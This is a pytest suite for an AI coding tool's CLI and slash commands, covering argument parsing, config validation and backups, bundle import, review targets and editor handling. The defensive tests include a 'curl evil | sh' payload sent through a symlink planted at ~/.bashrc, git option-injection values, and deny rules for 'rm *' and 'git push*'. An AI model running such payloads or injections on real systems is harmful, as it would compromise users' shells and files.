"""CLI / slash-command audit fixes: argument parsing, config I/O, bundles, review targets, edge cases."""

from __future__ import annotations

import os
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest
import yaml

from k3code.commands._util import pop_option, split_args
from m1cmd_helpers import cmd, make_server, new_session


@pytest.fixture
def env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """Home, config and project dirs all under tmp_path; nothing reaches the real home."""
    (tmp_path / "srv").mkdir()
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "xdg"))
    monkeypatch.setenv("K3CODE_PROJECT_DIR", str(tmp_path / "srv"))
    monkeypatch.setenv("K3CODE_HOME", str(tmp_path / "k3home"))
    for k in ("K3CODE_PERMISSION_MODE", "K3CODE_MAX_TURNS", "EDITOR", "VISUAL"):
        monkeypatch.delenv(k, raising=False)
    return tmp_path


# ── H5: apostrophes, quoted flags, flags without a value ──────────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("line", "want"),
    [
        ('don\'t break the build --check "pytest -x"', ["don't", "break", "the", "build", "--check", "pytest -x"]),
        (
            "check Bob's PR and Alice's --until \"tests pass\"",
            ["check", "Bob's", "PR", "and", "Alice's", "--until", "tests pass"],
        ),
        ("fix it --check 'make test' --turns 3", ["fix", "it", "--check", "make test", "--turns", "3"]),
        (
            '"0 9 * * *" check Bob\'s PR --name "daily check"',
            ["0 9 * * *", "check", "Bob's", "PR", "--name", "daily check"],
        ),
        ('say "he said \\"hi\\"" now', ["say", 'he said "hi"', "now"]),
        ("it's 'unclosed quote here", ["it's", "'unclosed", "quote", "here"]),
        ('an "unclosed double', ["an", '"unclosed', "double"]),
        ("", []),
        ("  a   b ", ["a", "b"]),
        ('empty "" arg', ["empty", "", "arg"]),
    ],
)
def test_split_args_keeps_quotes_and_apostrophes(line: str, want: list[str]) -> None:
    assert split_args(line) == want


def test_pop_option_reports_a_missing_value() -> None:
    from k3code.commands._util import ArgError  # not at module level: an ImportError there hides every other test

    for argv in (["fix", "--turns"], ["--check", "--turns", "3"], ["--turns="]):
        flag = "--check" if "--check" in argv else "--turns"
        with pytest.raises(ArgError, match=flag):
            pop_option(list(argv), flag)
    args = ["a", "--turns=5", "b"]
    assert pop_option(args, "--turns") == "5" and args == ["a", "b"]
    assert pop_option(["x"], "--turns") is None


async def test_goal_with_an_apostrophe_keeps_its_check_command(env: Path, monkeypatch) -> None:
    server, _ = make_server(env / "work", monkeypatch)
    sid = await new_session(server, env)
    res = await cmd(server, '/goal don\'t break the build --check "pytest -x" --turns 4', sid)
    state = server.goal_manager(server.live[sid]).state
    assert state is not None, res
    assert state.goal == "don't break the build"
    assert [g.command for g in state.gates] == ["pytest -x"] and state.max_turns == 4
    bad = await cmd(server, "/goal fix tests --turns", sid)
    assert "--turns needs a value" in bad["output"]
    await server.close()


async def test_goal_clear_without_a_goal(env: Path, monkeypatch) -> None:
    server, _ = make_server(env / "work", monkeypatch)
    sid = await new_session(server, env)
    assert "No goal" in (await cmd(server, "/goal clear", sid))["output"]
    await server.close()


class _Loops:
    def __init__(self) -> None:
        self.created: list[dict[str, Any]] = []

    def create(self, **kw: Any) -> dict[str, Any]:
        self.created.append(kw)
        return {"id": f"L{len(self.created)}"}

    def list(self, **_kw: Any) -> list[dict[str, Any]]:
        return []

    def stop(self, *_a: Any, **_kw: Any) -> list[str]:
        return []


class _Jobs:
    def __init__(self) -> None:
        self.added: list[dict[str, Any]] = []

    def add(self, **kw: Any) -> dict[str, Any]:
        self.added.append(kw)
        return {"id": "J1", "name": kw.get("name") or "job"}


class _Ctx:
    """The slice of a GatewayServer that /loop and /schedule use."""

    def __init__(self, cwd: Path) -> None:
        self.eng = SimpleNamespace(loops=_Loops(), jobs=_Jobs(), db=None, clock=None, runner=None)
        live = SimpleNamespace(stored=SimpleNamespace(cwd=str(cwd)))
        self.sessions = {"s1": live}
        self.config = SimpleNamespace(
            providers=[SimpleNamespace(models={"default": "m", "cheap": "c"})], default_model="default"
        )

    async def ensure_automation(self) -> Any:
        return self.eng


async def _run(command: Any, ctx: _Ctx, arg: str) -> dict[str, Any]:
    """Through the registry, as a user's line is: a command that raises answers with "/name failed: ..."."""
    from k3code.commands import CommandRegistry

    registry = CommandRegistry()
    registry.register(command)
    return await registry.dispatch(ctx, command.name, arg, "s1")


async def test_loop_and_schedule_keep_apostrophes_and_quoted_flags(env: Path) -> None:
    from k3code.commands.loop import LoopCommand
    from k3code.commands.schedule import ScheduleCommand

    ctx = _Ctx(env)
    await _run(LoopCommand(), ctx, 'check Bob\'s PR --until "tests pass"')
    made = ctx.eng.loops.created[0]
    assert made["prompt"] == "check Bob's PR" and made["until"] == "tests pass"
    await _run(ScheduleCommand(), ctx, 'add "0 9 * * *" check Bob\'s PR --name "daily check"')
    job = ctx.eng.jobs.added[0]
    assert job["prompt"] == "check Bob's PR" and job["name"] == "daily check"


async def test_loop_rejects_what_it_used_to_turn_into_a_prompt(env: Path) -> None:
    from k3code.commands.loop import LoopCommand

    ctx = _Ctx(env)
    for line in (
        "status extra words",
        "list please",
        "0m do it",
        "5m x --times 0",
        "5m x --times -2",
        "5m x --max-ticks 0",
        "5m x --max-ticks -1",
        "5m x --times",
    ):
        out = await _run(LoopCommand(), ctx, line)
        assert not ctx.eng.loops.created, (line, out)
        assert out["output"], line
    out = await _run(LoopCommand(), ctx, "fix the flaky test")  # still fine: a self-paced loop
    assert len(ctx.eng.loops.created) == 1 and "started" in out["output"]


async def test_schedule_resolves_cwd_against_the_session_and_checks_it(env: Path) -> None:
    from k3code.commands.schedule import ScheduleCommand

    proj = env / "proj"
    (proj / "sub").mkdir(parents=True)
    ctx = _Ctx(proj)
    out = await _run(ScheduleCommand(), ctx, 'add "0 9 * * *" go --cwd sub')
    assert ctx.eng.jobs.added[0]["cwd"] == str((proj / "sub").resolve()), out
    ctx.eng.jobs.added.clear()
    for line in ('add "0 9 * * *" go --cwd nowhere', 'add "0 9 * * *" go --model typo', 'add "0 9 * * *" go --name'):
        out = await _run(ScheduleCommand(), ctx, line)
        assert not ctx.eng.jobs.added, (line, out)
    await _run(ScheduleCommand(), ctx, 'add "0 9 * * *" go --model cheap')
    assert ctx.eng.jobs.added[0]["model"] == "cheap"


# ── H2: /permissions rm keeps the project config trusted ──────────────────────────────────────────────────────


async def test_permissions_rm_of_a_project_rule_keeps_the_project_trusted(env: Path, monkeypatch) -> None:
    from k3code import trust

    proj = env / "proj"
    (proj / ".k3code").mkdir(parents=True)
    cfg = proj / ".k3code" / "config.yaml"
    cfg.write_text(yaml.safe_dump({"permissions": {"bash": {"rm *": "deny", "git push*": "deny"}}}))
    server, _ = make_server(env / "work", monkeypatch)  # first: it points K3CODE_HOME (the trust store) elsewhere
    assert trust.record(proj, trusted=True)
    sid = await new_session(server, proj)
    listing = (await cmd(server, "/permissions", sid))["output"]
    first = next(line.split()[0] for line in listing.splitlines() if "rm" in line and "[project]" in line)
    out = (await cmd(server, f"/permissions rm {first}", sid))["output"]
    assert out.startswith("Removed"), out
    assert trust.decision(proj) == trust.TRUSTED
    after = (await cmd(server, "/permissions", sid))["output"]
    assert "git push*" in after and "rm *" not in after  # the other deny rule still applies
    assert list(cfg.parent.glob("config.yaml.bak-*")), "the removal makes a backup"
    await server.close()


# ── H8 / M8: /config set refuses values that break a session or a turn ────────────────────────────────────────

BAD_SETS = [
    "permission_mode bogus",
    "headless_permission bogus",
    "permision_mode yolo",  # a typo is not silently ignored
    "max_tokens 0",
    "max_tokens -5",
    "max_turns -3",
    "temperature 99",
    "default_model nonexistent",
    "automation.max_concurrent -1",
    "router.max_inline_wait abc",
    "reliability.enabled maybe",
    "reliability.session_usd abc",
    "reliability.session_eur -1",
    "reliability.day_eur abc",
    "learning.enabled nope",
    "providers []",
    "retention.usage_days -1",
]


@pytest.mark.parametrize("setting", BAD_SETS)
async def test_config_set_refuses_bad_values(env: Path, monkeypatch, setting: str) -> None:
    server, _ = make_server(env / "work", monkeypatch)
    sid = await new_session(server, env)
    cfg = Path(os.environ["K3CODE_HOME"]) / "config.yaml"
    res = await cmd(server, f"/config set {setting}", sid)
    assert res["output"].startswith("Invalid config:"), res
    assert not cfg.exists()  # nothing was written
    await server.close()


async def test_config_set_accepts_what_is_valid(env: Path, monkeypatch) -> None:
    server, _ = make_server(env / "work", monkeypatch)
    sid = await new_session(server, env)
    for good in (
        "permission_mode plan",
        "max_tokens 4096",
        "temperature 0.5",
        "default_model default",
        "reliability.session_usd 2.5",
        "reliability.session_eur 2",
        "learning.enabled false",
        "retention.usage_days 90",
        "sandbox.home_readonly [.cache]",
    ):
        res = await cmd(server, f"/config set {good}", sid)
        assert res["output"].startswith("Set "), (good, res)
    await server.close()


def test_a_file_with_an_unknown_top_level_key_still_loads(env: Path) -> None:
    from k3code.config import load_config

    cfg = Path(os.environ["K3CODE_HOME"]) / "config.yaml"
    cfg.parent.mkdir(parents=True, exist_ok=True)
    cfg.write_text("permision_mode: yolo\nmax_turns: 4\n")
    assert load_config(project_dir=env).max_turns == 4


# ── M1: an invalid config is a message naming the file, not a traceback ───────────────────────────────────────

BAD_CONFIGS = [
    "a: [unclosed\n",
    "- just\n- a list\n",
    "providers: [1]\n",
    "web: 5\n",
    "models: {m: 5}\n",
    "autonomy: [1]\n",
    "max_turns: lots\n",
]


@pytest.mark.parametrize("text", BAD_CONFIGS)
def test_load_config_raises_a_config_error_naming_the_file(env: Path, text: str) -> None:
    from k3code.config import ConfigError, load_config

    cfg = Path(os.environ["K3CODE_HOME"]) / "config.yaml"
    cfg.parent.mkdir(parents=True, exist_ok=True)
    cfg.write_text(text)
    with pytest.raises(ConfigError, match="config.yaml"):
        load_config(project_dir=env)


def test_empty_sections_are_unset_not_errors(env: Path) -> None:
    from k3code.config import load_config

    cfg = Path(os.environ["K3CODE_HOME"]) / "config.yaml"
    cfg.parent.mkdir(parents=True, exist_ok=True)
    cfg.write_text("providers:\nlearning:\ndisplay:\nmax_turns: 3\n")
    got = load_config(project_dir=env)
    assert got.providers == [] and got.max_turns == 3 and got.display.theme == ""


def test_a_bad_environment_variable_names_itself(env: Path, monkeypatch) -> None:
    from k3code.config import ConfigError, load_config

    monkeypatch.setenv("K3CODE_MAX_TURNS", "abc")
    with pytest.raises(ConfigError, match="K3CODE_MAX_TURNS"):
        load_config(project_dir=env)


def _break_config(text: str = "a: [unclosed\n") -> Path:
    cfg = Path(os.environ["K3CODE_HOME"]) / "config.yaml"
    cfg.parent.mkdir(parents=True, exist_ok=True)
    cfg.write_text(text)
    return cfg


def test_cli_prints_the_config_error_instead_of_a_traceback(env: Path, monkeypatch) -> None:
    from click.testing import CliRunner

    from k3code.cli import cli

    monkeypatch.chdir(env)
    cfg = _break_config()
    r = CliRunner().invoke(cli, ["-p", "hello"])
    assert r.exit_code == 1 and str(cfg) in r.output and "Traceback" not in r.output, r.output
    assert not isinstance(r.exception, Exception) or isinstance(r.exception, SystemExit), r.exception


def test_doctor_reports_a_broken_config_as_a_failed_check(env: Path, monkeypatch) -> None:
    import json

    from click.testing import CliRunner

    from k3code.cli import cli

    monkeypatch.chdir(env)
    cfg = _break_config()
    r = CliRunner().invoke(cli, ["doctor", "--no-probe", "--json"])
    assert r.exit_code == 1, r.output
    checks = {c["name"]: c for c in json.loads(r.output[r.output.index("{") :])["checks"]}
    assert checks["config"]["status"] == "fail" and str(cfg) in checks["config"]["detail"]
    r = CliRunner().invoke(cli, ["doctor", "--install"])  # the install subset always exits 0
    assert r.exit_code == 0 and not isinstance(r.exception, Exception | KeyError), (r.output, r.exception)


# ── M12: -p with nothing in it ────────────────────────────────────────────────────────────────────────────────


@pytest.mark.parametrize("prompt", ["", "   ", "\n"])
def test_blank_prompt_is_a_usage_error(env: Path, monkeypatch, prompt: str) -> None:
    from click.testing import CliRunner

    from k3code.cli import cli

    monkeypatch.chdir(env)
    r = CliRunner().invoke(cli, ["-p", prompt])
    assert r.exit_code == 2 and "-p needs a prompt" in r.output, r.output


# ── M2: /debug dump ───────────────────────────────────────────────────────────────────────────────────────────


def _mcp_config() -> tuple[Any, list[str]]:
    """A config whose MCP server holds secrets in places no text pattern looks at; values are built at run time."""
    from k3code.config import McpServerConfig, Settings

    dsn = "postgres://" + "svc" + ":" + "pw-audit-7731" + "@db.internal/app"
    header = "audit-header-" + "value-90210"
    cfg = Settings(
        mcp={
            "servers": {
                "pg": McpServerConfig(command="pg-mcp", env={"DATABASE_URL": dsn}),
                "web": McpServerConfig(url="http://127.0.0.1:9/mcp", headers={"X-Api-Auth": header}),
            }
        }
    )
    return cfg, ["pw-audit-7731", header]


def test_safe_config_redacts_mcp_env_and_headers() -> None:
    import json

    from k3code import debugdump

    cfg, secrets = _mcp_config()
    text = json.dumps(debugdump.safe_config(cfg))
    for s in secrets:
        assert s not in text
    assert "pg-mcp" in text  # only the secrets go, not the shape of the config


async def test_debug_dump_options(env: Path, monkeypatch) -> None:
    import tarfile

    server, _ = make_server(env / "work", monkeypatch)
    sid = await new_session(server, env)
    for i in range(5):
        server.emit("probe", {"i": i})
    cfg, secrets = _mcp_config()
    server.config.mcp = cfg.mcp
    assert "Usage" in (await cmd(server, "/debug dump 0", sid))["output"]
    outs = [(await cmd(server, "/debug dump 2", sid))["output"] for _ in range(2)]  # two dumps, one second
    paths = [Path(o.split(": ", 1)[1]) for o in outs]
    assert paths[0] != paths[1] and all(p.is_file() for p in paths)
    with tarfile.open(paths[0]) as tar:
        blob = b"".join(tar.extractfile(n).read() for n in tar.getnames())
    assert all(s.encode() not in blob for s in secrets)
    assert (await cmd(server, "/debug off", sid))["output"].endswith("OFF.") and server.debug is False
    assert (await cmd(server, "/debug off", sid))["output"].endswith("OFF.") and server.debug is False
    assert (await cmd(server, "/debug on", sid))["output"].endswith("ON.") and server.debug is True
    assert "Usage" in (await cmd(server, "/debug sideways", sid))["output"]
    await server.close()


# ── M3 / M4: config files are written atomically, with private backups, and /config rollback is exact ─────────


def test_write_yaml_is_atomic_keeps_modes_and_symlinks(tmp_path: Path, monkeypatch) -> None:
    from k3code import confio

    cfg = tmp_path / "config.yaml"
    cfg.write_text("# keep me\nmax_turns: 1\n")
    cfg.chmod(0o600)
    bak = confio.write_yaml(cfg, {"max_turns": 2})
    assert bak is not None and (bak.stat().st_mode & 0o777) == 0o600 and (cfg.stat().st_mode & 0o777) == 0o600
    assert bak.read_text() == "# keep me\nmax_turns: 1\n"

    # a failure between "temp file written" and "replaced" leaves the old file whole and no temp file behind
    def boom(*_a: Any, **_k: Any) -> None:
        raise OSError("disk full")

    monkeypatch.setattr(os, "replace", boom)
    with pytest.raises(OSError, match="disk full"):
        confio.write_yaml(cfg, {"max_turns": 3})
    monkeypatch.undo()
    assert confio.read_yaml(cfg) == {"max_turns": 2}
    assert [p.name for p in tmp_path.iterdir() if p.name.endswith(".tmp")] == []

    real = tmp_path / "real" / "config.yaml"
    real.parent.mkdir()
    real.write_text("max_turns: 5\n")
    link = tmp_path / "linked.yaml"
    link.symlink_to(real)
    confio.write_yaml(link, {"max_turns": 6})
    assert link.is_symlink() and confio.read_yaml(real) == {"max_turns": 6}


def test_a_reader_never_sees_a_half_written_config(tmp_path: Path) -> None:
    import threading

    from k3code import confio

    cfg = tmp_path / "config.yaml"
    cfg.write_text("max_turns: 0\n")
    stop = threading.Event()
    bad: list[str] = []

    def read() -> None:
        while not stop.is_set():
            text = cfg.read_text()
            if not text.startswith("max_turns:") and not text.startswith("padding:"):
                bad.append(text[:40])

    t = threading.Thread(target=read)
    t.start()
    try:
        for i in range(150):
            confio.write_yaml(cfg, {"padding": "x" * 20000, "max_turns": i}, backup=False)
    finally:
        stop.set()
        t.join()
    assert bad == []


def test_backups_are_pruned_to_the_newest_ten(tmp_path: Path) -> None:
    from k3code import confio

    cfg = tmp_path / "config.yaml"
    cfg.write_text("max_turns: 0\n")
    for i in range(1, 16):
        confio.write_yaml(cfg, {"max_turns": i})
    found = confio.backups(cfg)
    assert len(found) == confio.KEEP_BACKUPS
    assert confio.read_yaml(found[-1]) == {"max_turns": 14}  # the newest backup is the file before the last write


async def test_rollback_restores_the_backup_bytes_with_its_comments(env: Path, monkeypatch) -> None:
    server, _ = make_server(env / "work", monkeypatch)
    sid = await new_session(server, env)
    cfg = Path(os.environ["K3CODE_HOME"]) / "config.yaml"
    cfg.parent.mkdir(parents=True, exist_ok=True)
    original = "# my notes: keep this comment\nmax_turns: 5   # trailing\nlearning:\n  enabled: true\n"
    cfg.write_text(original)
    await cmd(server, "/config set max_turns 9", sid)
    assert "my notes" not in cfg.read_text()  # the rewrite drops comments; the backup has them
    assert "Rolled" in (await cmd(server, "/config rollback", sid))["output"]
    assert cfg.read_text() == original
    assert server.config.max_turns == 5
    await server.close()


async def test_chain_edits_are_seen_by_config_rollback(env: Path, monkeypatch) -> None:
    from k3code import chain_config

    server, _ = make_server(env / "work", monkeypatch)  # first: it points K3CODE_HOME elsewhere
    sid = await new_session(server, env)
    home = Path(os.environ["K3CODE_HOME"])
    home.mkdir(parents=True, exist_ok=True)
    cfg = home / "config.yaml"
    provider = {"kind": "openai", "base_url": "http://127.0.0.1:9/v1", "api_key_env": "A_KEY"}
    providers = [
        {"name": "a", **provider, "models": {"default": ["m1", "m2"]}},
        {"name": "b", **provider, "models": {"default": "m3"}},
    ]
    cfg.write_text(yaml.safe_dump({"providers": providers}))
    chain_config.edit_config("move", ["b", "1"])  # two edits in one second used to share one backup name
    second = cfg.read_text()
    chain_config.edit_config("remove", ["a", "m2"])
    assert len(list(home.glob("config.yaml.bak-*"))) == 2
    assert "Rolled" in (await cmd(server, "/config rollback", sid))["output"]
    assert cfg.read_text() == second  # the state before the LAST chain edit, not an older one
    await server.close()


def test_chain_move_rejects_superscript_digits() -> None:
    from k3code import chain_config

    with pytest.raises(chain_config.ChainEditError):
        chain_config.apply_edit([{"name": "a"}, {"name": "b"}], "move", ["a", "²"])


# ── M5: /rename sticks ────────────────────────────────────────────────────────────────────────────────────────


async def test_rename_survives_the_next_turn(env: Path, monkeypatch) -> None:
    from m1cmd_helpers import submit_and_wait

    server, _ = make_server(env / "work", monkeypatch)
    sid = await new_session(server, env)
    assert "Renamed" in (await cmd(server, "/rename my new title", sid))["output"]
    assert server.live[sid].stored.title == "my new title"
    await submit_and_wait(server, "hello")
    stored = server.store.get(sid)
    assert stored is not None and stored.title == "my new title" and stored.messages
    await server.close()


# ── M6: one bad imported session cannot break the store ───────────────────────────────────────────────────────


def _bundle_with(path: Path, sessions: list[dict[str, Any]]) -> Path:
    import io
    import json
    import tarfile

    with tarfile.open(path, "w:gz") as tar:
        members = {"manifest.json": json.dumps({"version": 1, "created": "now", "contents": {}}).encode()}
        for obj in sessions:
            members[f"sessions/{obj['session_id']}.json"] = json.dumps(obj).encode()
        for name, data in members.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return path


async def test_import_skips_a_session_that_is_not_one(env: Path, monkeypatch) -> None:
    from k3code.bundle import apply_bundle, read_bundle

    server, _ = make_server(env / "work", monkeypatch)
    good = {"session_id": "good1", "title": "fine", "messages": [{"role": "user", "content": "hi"}]}
    bad = [
        {"session_id": "bad1", "messages": "notalist"},
        {"session_id": "bad2", "messages": ["x"]},
        {"session_id": "bad3", "title": 5, "messages": []},
        {"session_id": "odd4", "messages": [], "usage": "x", "meta": [1]},  # cleaned, not skipped
    ]
    bundle = read_bundle(_bundle_with(env / "b.k3bundle", [good, *bad]))
    rep = apply_bundle(bundle, store=server.store, cwd=env)
    assert set(rep.invalid_sessions) == {"bad1", "bad2", "bad3"} and set(rep.sessions) == {"good1", "odd4"}
    assert "skipped session bad1" in rep.describe()
    listed = (await rpc_(server, "session.list", {}))["result"]["sessions"]
    assert {r["id"] for r in listed} == set(rep.sessions.values())
    resumed = await rpc_(server, "session.resume", {"session_id": rep.sessions["good1"]})
    assert "result" in resumed
    await server.close()


async def rpc_(server: Any, method: str, params: dict[str, Any]) -> dict[str, Any]:
    from m1cmd_helpers import rpc

    return await rpc(server, method, params)


async def test_a_row_that_is_already_bad_does_not_break_the_list(env: Path, monkeypatch) -> None:
    server, _ = make_server(env / "work", monkeypatch)
    sid = await new_session(server, env)
    server.store._db.execute(
        "UPDATE sessions SET messages = ?, meta = ? WHERE session_id = ?", ('"notalist"', "[1]", sid)
    )
    server.store._db.commit()
    other = await new_session(server, env)
    listed = (await rpc_(server, "session.list", {}))["result"]["sessions"]
    assert {r["id"] for r in listed} == {sid, other}
    await server.close()


@pytest.mark.parametrize("what", ["truncated", "non_utf8_manifest", "list_manifest", "bad_settings", "not_gzip"])
def test_read_bundle_wraps_every_failure_in_bundle_error(tmp_path: Path, what: str) -> None:
    import gzip
    import io
    import json
    import tarfile

    from k3code.bundle import BundleError, read_bundle

    def tar_with(members: dict[str, bytes]) -> bytes:
        raw = io.BytesIO()
        with tarfile.open(fileobj=raw, mode="w:gz") as tar:
            for name, data in members.items():
                info = tarfile.TarInfo(name)
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
        return raw.getvalue()

    ok = json.dumps({"version": 1}).encode()
    path = tmp_path / "b.k3bundle"
    if what == "truncated":
        path.write_bytes(tar_with({"manifest.json": ok, "sessions/s1.json": b"x" * 5000})[:-40])
    elif what == "non_utf8_manifest":
        path.write_bytes(tar_with({"manifest.json": b'{"version": 1, "created": "\xff\xfe"}'}))  # not UTF-8, no BOM
    elif what == "list_manifest":
        path.write_bytes(tar_with({"manifest.json": b"[1, 2]"}))
    elif what == "bad_settings":
        path.write_bytes(tar_with({"manifest.json": ok, "settings/user.config.yaml": b"a: [unclosed\n"}))
    else:
        path.write_bytes(gzip.compress(b"this is not a tar archive"))
    with pytest.raises(BundleError):
        read_bundle(path)


# ── M7: /update-config changes the running config the way /config set does ────────────────────────────────────


async def test_update_config_reaches_the_live_config(env: Path, monkeypatch) -> None:
    from k3code.learning import updateconfig as uc
    from k3code.paths import user_config_path

    server, _ = make_server(env / "work", monkeypatch)
    sid = await new_session(server, env)

    async def apply(*_a: Any, **_k: Any) -> dict[str, Any]:
        return {"choice": "apply"}

    server.clarify = apply  # type: ignore[method-assign]
    patch = {
        "goal": {"max_turns": 7},
        "display": {"focus_mode": True},
        "max_turns": "5",
        "task_tiers": {"title": "cheap"},
    }

    async def fake_translate(*_a: Any, **_k: Any) -> dict[str, Any]:
        return patch

    monkeypatch.setattr(uc, "translate", fake_translate)
    out = await uc.run(server, sid, "do it", user_config_path())
    assert "Config updated" in out, out
    assert server.config.goal.max_turns == 7 and server.config.display.focus_mode is True
    assert server.config.max_turns == 5 and isinstance(server.config.max_turns, int)
    assert server.config.task_tiers == {"title": "cheap"}
    assert confio_read()["max_turns"] == 5  # written as a number, not the model's "5"
    await server.close()


def confio_read() -> dict[str, Any]:
    from k3code import confio
    from k3code.paths import user_config_path

    return confio.read_yaml(user_config_path())


# ── M9: `k3code slash` does not pretend a loop or goal can outlive its throwaway session ──────────────────────


async def test_slash_via_daemon_refuses_what_needs_a_session(tmp_path: Path) -> None:
    from k3code.daemon import slash_via_daemon

    nowhere = tmp_path / "no-daemon.sock"
    for line in ("/loop 5m check the build", "/goal fix the tests --turns 3", "loop daily 09:00 x"):
        out = await slash_via_daemon(line, cwd=str(tmp_path), sock=nowhere)
        assert out.startswith("error: ") and "throwaway" in out, (line, out)
    for line in ("/loop list", "/loop", "/goal status", "/schedule list", "/automations list"):
        with pytest.raises(OSError):  # these do try to reach the (absent) daemon
            await slash_via_daemon(line, cwd=str(tmp_path), sock=nowhere)


# ── M10: /memory ──────────────────────────────────────────────────────────────────────────────────────────────


async def test_memory_add_keeps_a_user_word_in_the_text(env: Path, monkeypatch) -> None:
    server, _ = make_server(env / "work", monkeypatch)
    proj = env / "proj"
    proj.mkdir()
    sid = await new_session(server, proj)
    out = await cmd(server, "/memory add remember to pass --user flag", sid)
    assert "Added to" in out["output"] and "flag" in Path(out["path"]).read_text()
    assert "--user" in Path(out["path"]).read_text()
    user = await cmd(server, "/memory add prefer tabs --user", sid)
    assert user["path"] != out["path"] and "prefer tabs" in Path(user["path"]).read_text()
    assert "--user" not in Path(user["path"]).read_text()
    lead = await cmd(server, "/memory --user add short answers", sid)
    assert lead["path"] == user["path"]
    await server.close()


async def test_mem0_key_from_the_env_file_is_used(env: Path, monkeypatch) -> None:
    import httpx

    from k3code.commands.memory_cmd import mem0_search
    from k3code.config import Settings
    from k3code.setup.state import set_env_var

    key = "k3-" + "audit-" + "mem0key"
    set_env_var("AUDIT_MEM0_KEY", key)  # only in the env file, not in os.environ
    monkeypatch.delenv("AUDIT_MEM0_KEY", raising=False)
    seen: dict[str, str] = {}

    def handler(request: httpx.Request) -> httpx.Response:
        seen.update(request.headers)
        return httpx.Response(200, json={"results": [{"memory": "likes tabs"}]})

    cfg = Settings(mem0={"url": "http://mem0.test", "api_key_env": "AUDIT_MEM0_KEY"})
    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        assert await mem0_search(cfg, "tabs", client=client) == ["likes tabs"]
    assert seen.get("x-api-key") == key


# ── M11: /review targets ──────────────────────────────────────────────────────────────────────────────────────


async def test_review_target_handling(env: Path, monkeypatch) -> None:
    from k3code.commands.review import collect_target
    from m1cmd_helpers import git_repo

    repo = git_repo(env / "repo")
    home = env / "home"
    home.mkdir()
    (home / "note.py").write_text("print('hi')\n")
    monkeypatch.setenv("HOME", str(home))
    desc, text = await collect_target(repo, "~/note.py")
    assert desc.startswith("file") and "1: print('hi')" in text
    victim = env / "pwned.txt"
    for bad in (f"--output={victim}..x", "-p", "--stat"):
        with pytest.raises(ValueError, match="cannot start with"):
            await collect_target(repo, bad)
    assert not victim.exists()
    with pytest.raises(ValueError):
        await collect_target(repo, "~nouser-k3/x")
    (repo / "a.py").write_text("x = 2\n")
    import subprocess

    subprocess.run(["git", "commit", "-qam", "two"], cwd=repo, check=True)
    assert "x = 2" in (await collect_target(repo, "HEAD~1..HEAD"))[1]


# ── M13: $EDITOR ──────────────────────────────────────────────────────────────────────────────────────────────


def _editor(env: Path, body: str) -> str:
    script = env / "fake-editor.sh"
    script.write_text(f"#!/bin/sh\n{body}\n")
    script.chmod(0o755)
    return str(script)


def test_editor_that_cannot_start_is_an_error_message(env: Path, monkeypatch) -> None:
    from click.testing import CliRunner

    from k3code.cli import cli

    monkeypatch.chdir(env)
    for editor in ("/nonexistent/ed", "vi 'x"):
        monkeypatch.setenv("EDITOR", editor)
        for args in (["config-edit"], ["memory", "edit", "--user"]):
            r = CliRunner().invoke(cli, args)
            assert r.exit_code == 1 and ("$VISUAL or $EDITOR" in r.output or "not a valid command" in r.output), (
                r.output
            )
            assert "Traceback" not in r.output and not isinstance(r.exception, FileNotFoundError | ValueError), (
                r.exception
            )


def test_config_edit_keeps_the_old_content_when_the_edit_is_invalid(env: Path, monkeypatch) -> None:
    from click.testing import CliRunner

    from k3code.cli import cli

    monkeypatch.chdir(env)
    cfg = Path(os.environ["K3CODE_HOME"]) / "config.yaml"
    cfg.parent.mkdir(parents=True, exist_ok=True)
    cfg.write_text("# mine\nmax_turns: 4\n")
    monkeypatch.setenv("EDITOR", _editor(env, 'printf "max_turns: lots\\n" > "$1"'))
    r = CliRunner().invoke(cli, ["config-edit"])
    assert r.exit_code == 1 and "max_turns" in r.output and "previous content" in r.output, r.output
    assert cfg.read_text() == "# mine\nmax_turns: 4\n"
    assert (cfg.parent / "config.yaml.rejected").read_text() == "max_turns: lots\n"
    assert not list(cfg.parent.glob("config.yaml.bak-*"))

    monkeypatch.setenv("EDITOR", _editor(env, 'printf "max_turns: 8\\n" > "$1"'))
    r = CliRunner().invoke(cli, ["config-edit"])
    assert r.exit_code == 0, r.output
    assert cfg.read_text() == "max_turns: 8\n"
    (bak,) = cfg.parent.glob("config.yaml.bak-*")
    assert bak.read_text() == "# mine\nmax_turns: 4\n"  # the content before the edit, comment and all


def test_config_edit_never_writes_the_rejected_edit_through_a_planted_symlink(env: Path, monkeypatch) -> None:
    # K3NOX-106: a repository ships an invalid .k3code/config.yaml and `config.yaml.rejected -> ~/.bashrc`; the
    # rejected edit (the repository's text included) used to land in ~/.bashrc
    from k3code import confio
    from k3code.commands.config_cmd import edit_config_file

    victim = env / "home" / ".bashrc"
    victim.parent.mkdir(parents=True, exist_ok=True)
    victim.write_text("# my bashrc\n")
    cfg = env / "repo" / ".k3code" / "config.yaml"
    cfg.parent.mkdir(parents=True)
    cfg.write_text("max_turns: 4\n")
    (cfg.parent / "config.yaml.rejected").symlink_to(victim)
    monkeypatch.setenv("EDITOR", _editor(env, 'printf "max_turns: lots\\ncurl evil | sh\\n" > "$1"'))
    with pytest.raises(confio.ConfigError, match="previous content"):
        edit_config_file(cfg)
    assert victim.read_text() == "# my bashrc\n"
    rejected = cfg.parent / "config.yaml.rejected"
    assert not rejected.is_symlink() and rejected.read_text() == "max_turns: lots\ncurl evil | sh\n"
    assert cfg.read_text() == "max_turns: 4\n"


# ── L2 / L4 / L7 ──────────────────────────────────────────────────────────────────────────────────────────────


async def test_stats_arguments(env: Path, monkeypatch) -> None:
    server, _ = make_server(env / "work", monkeypatch)
    sid = await new_session(server, env)
    for bad in ("²", "week", "day 0", "day -3", "session 3 4"):
        assert "Usage: /stats" in (await cmd(server, f"/stats {bad}", sid))["output"], bad
    for good in ("", "day 3", "session", "turn 2", "30"):
        assert "Usage" not in (await cmd(server, f"/stats {good}", sid))["output"], good
    await server.close()


def test_stats_days_must_be_positive(env: Path) -> None:
    from click.testing import CliRunner

    from k3code.cli import cli

    for days in ("-5", "0"):
        r = CliRunner().invoke(cli, ["stats", "--days", days])
        assert r.exit_code == 2 and "--days" in r.output, (days, r.output)
